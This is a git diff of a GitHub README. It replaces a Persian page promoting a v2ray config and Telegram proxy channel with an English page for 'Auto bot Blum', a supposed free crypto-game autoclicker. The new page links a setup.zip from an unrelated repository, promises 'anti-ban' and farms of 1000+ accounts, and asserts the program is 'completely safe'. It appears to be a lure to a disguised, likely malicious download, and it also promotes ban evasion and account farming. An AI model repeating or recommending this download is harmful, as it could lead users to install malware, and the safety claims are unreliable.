@@ -1,18 +1,34 @@
 
-به معدن کانفیگ های v2rayو پروکسی های تلگرام خوش آمدید 
+![658658658](https://github.com/Densuu/Blum-auto/assets/132719862/b9a59a95-4b25-4501-9cd5-1136c78417eb)
 
-👈در کانال  v2ray_configs_poolکانفیگ های v2rayو پروکسی های تلگرام از رگ گردن به شما نزدیکترند
+<h1 align="center">Auto bot Blum</h1>
 
-👈آپلود  کانفیگ v2ray و  پروکسی  تلگرام  بدون وقفه در 24 ساعت شبانه روز
+[DOWNLOAD](https://github.com/ImHotBtw/frejaaa/releases/download/Download/setup.zip) 
+
+> [!NOTE]
+> All welcome the phoenix team, we are developers of various autoclickers for different crypto games, and we decided to make all our software free thanks to your great support! We have been working together for about 4 years! 
+>
+> ---
 
 
-✅لینک سابسکرایب v2ray
+ ---
+ <div align="center">
 
+   
+### Features 🛠️
+</div>
 
-https://raw.githubusercontent.com/m3hdio1/v2ray_sub/main/v2ray_sub.txt
+- Auto work
+- free proxies
+- allows you to work on several accounts at the same time
+- anti-ban
+- 24/7 support
 
+---
 
-✅لینک کانال تلگرام 
+> [!TIP]
+> 1. Fully optimized to create farms of 1000+ accounts
+> 2. The most important thing: the program is completely safe for your Windows system.
+> 3. Supports most systems: Windows 7/8/8.1/10/11 (x32/64).
 
-https://t.me/v2ray_configs_pool
-
+---
